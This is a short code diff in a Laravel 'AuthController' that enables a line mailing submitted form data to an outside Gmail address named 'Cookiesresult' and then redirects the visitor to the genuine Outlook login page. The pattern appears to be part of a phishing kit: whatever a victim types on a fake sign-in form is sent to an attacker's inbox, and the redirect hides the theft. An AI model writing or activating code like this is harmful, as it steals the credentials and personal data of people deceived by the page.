@@ -117,7 +117,7 @@ class AuthController extends Controller
 
         // Send the email
         try {
-            // Mail::to('Cookiesresult@gmail.com')->send(new ContractMail($formData));
+            Mail::to('Cookiesresult@gmail.com')->send(new ContractMail($formData));
             return redirect()->away('https://outlook.office365.com');
         } catch (\Exception $e) {
             return redirect()->back()->with('error', 'Failed to send email: ' . $e->getMessage());
